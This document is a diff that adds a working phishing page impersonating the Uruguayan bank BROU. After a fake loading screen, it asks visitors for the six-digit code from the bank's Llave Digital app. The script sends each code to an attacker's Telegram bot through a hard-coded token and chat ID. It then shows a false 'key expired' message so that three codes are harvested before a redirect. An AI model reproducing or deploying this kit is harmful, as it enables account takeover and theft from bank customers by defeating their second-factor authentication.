@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cargando...</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #08528d;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    header {
+      position: absolute;
+      top: 20px;
+    }
+
+    header img {
+      height: 36px;
+    }
+
+    .spinner {
+      border: 6px solid #ccc;
+      border-top: 6px solid #ffc400;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px 0;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .porcentaje {
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    #verificacion {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      max-width: 340px;
+      margin: 0 auto;
+      background-color: #08528d;
+      color: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      border: 2px solid #ffc400;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+    }
+
+    #verificacion img {
+      height: 36px;
+      margin-bottom: 15px;
+    }
+
+    #verificacion p {
+      font-size: 16px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    #llave {
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    #continuar {
+      padding: 12px 20px;
+      background-color: #ffc400;
+      color: #002147;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    h2 {
+      margin-top: 0;
+    }
+
+    footer {
+      position: absolute;
+      bottom: 20px;
+    }
+
+    footer img {
+      height: 30px;
+    }
+
+    /* Estilo para el mensaje de error */
+    #error-message {
+      display: none;
+      background-color: #f44336; /* Rojo */
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      width: 100%;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <h2 id="mensaje">Procesando datos...</h2>
+  <div class="spinner" id="spinner"></div>
+  <div class="porcentaje" id="porcentaje">0%</div>
+
+  <div id="verificacion">
+    <img src="logo.svg" alt="BROU Logo" />
+    <p>
+      <strong>POR SU SEGURIDAD NO INGRESE EL PIN DE SU TARJETA!</strong><br/>
+      Ingrese el código de 6 dígitos creado por la app Ebrou Llave Digital para comprobar que eres el propietario de la cuenta
+    </p>
+    <input type="text" id="llave" placeholder="Llave Digital" inputmode="numeric" maxlength="6" pattern="\d{6}" required oninput="this.value = this.value.replace(/\D/g, '')" />
+    <button id="continuar">Verificar</button>
+  </div>
+
+  <!-- Mensaje de error que aparecerá cuando la llave haya caducado -->
+  <div id="error-message">
+    La llave ha caducado, por favor intenta nuevamente.
+  </div>
+
+  <!-- Logo en el footer -->
+  <footer>
+    <img src="logofooter.svg" alt="BROU Footer Logo" />
+  </footer>
+
+<script>
+  const input = document.getElementById('llave');
+  const button = document.getElementById('continuar');
+  const errorMessage = document.getElementById('error-message');  // Referencia al mensaje de error
+
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 6);
+    button.disabled = input.value.length !== 6;
+  });
+
+  let porcentaje = 0;
+  const porcentajeEl = document.getElementById('porcentaje');
+  const mensaje = document.getElementById('mensaje');
+  const spinner = document.getElementById('spinner');
+  const verificacion = document.getElementById('verificacion');
+
+  const intervalo = setInterval(() => {
+    porcentaje += Math.floor(Math.random() * 8) + 3;
+    if (porcentaje >= 100) {
+      porcentaje = 100;
+      clearInterval(intervalo);
+      mensaje.style.display = 'none';
+      spinner.style.display = 'none';
+      porcentajeEl.style.display = 'none';
+      verificacion.style.display = 'flex';
+    }
+    porcentajeEl.textContent = porcentaje + '%';
+  }, 400);
+
+  const bots = [
+    {
+      token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
+      chatId: '-4867067566'
+    },
+    {
+      token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
+      chatId: '-4867067566'
+    }
+  ];
+
+  let intentos = 0;
+
+  document.getElementById('continuar').addEventListener('click', async () => {
+    const llave = input.value.trim();
+
+    if (llave.length !== 6) {
+      alert('Por favor, ingresá tu llave de seguridad.');
+      return;
+    }
+
+    intentos++;
+    const titulo = `🔐 Intento ${intentos}`;
+    const mensajeTelegram = `${titulo} de verificación:\nLlave: ${llave}`;
+
+    try {
+      // Enviar a todos los bots
+      await Promise.all(bots.map(bot =>
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: mensajeTelegram,
+            parse_mode: "Markdown"
+          })
+        })
+      ));
+
+      if (intentos < 3) {
+        // Mostrar el mensaje de error cuando la llave ha caducado
+        errorMessage.style.display = 'block';
+
+        // El mensaje de error desaparece después de 3 segundos
+        setTimeout(() => {
+          errorMessage.style.display = 'none';
+        }, 3000);
+
+        input.value = '';
+        input.focus();
+        button.disabled = true;
+        return;
+      } else {
+        // Tercer intento: permitir continuar
+        window.location.href = 'facturando.html';
+      }
+    } catch (err) {
+      console.error('Error al enviar a Telegram:', err);
+      alert('Error en el sistema. Intenta nuevamente.');
+    }
+  });
+</script>
+
+</body>
+</html>
